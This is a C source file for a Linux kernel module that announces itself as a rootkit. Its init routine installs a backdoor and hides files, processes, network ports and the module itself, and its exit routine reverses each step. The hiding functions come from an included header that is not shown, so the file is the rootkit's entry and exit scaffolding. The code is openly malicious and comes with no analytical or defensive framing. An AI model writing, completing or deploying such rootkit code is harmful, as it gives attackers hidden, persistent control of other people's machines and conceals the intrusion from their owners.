#include "../header/hide.h"

static int __init mode_init(void) {
    printk(KERN_INFO "Rootkit is entering.\n");
    backdoor();
    disable_module();
    hide_file();
    proc_hide();
    port_hide();
    mod_hide();
    return 0;
}

static void __exit mode_exit(void) {
    cleanbackdoor();
    disable_module_exit();
    hide_file_cleanup();
    proc_unhide();
    port_unhide();
    mod_unhide();
    printk(KERN_INFO "Rootkit is leaving.\n");
}

module_init(mode_init);
module_exit(mode_exit);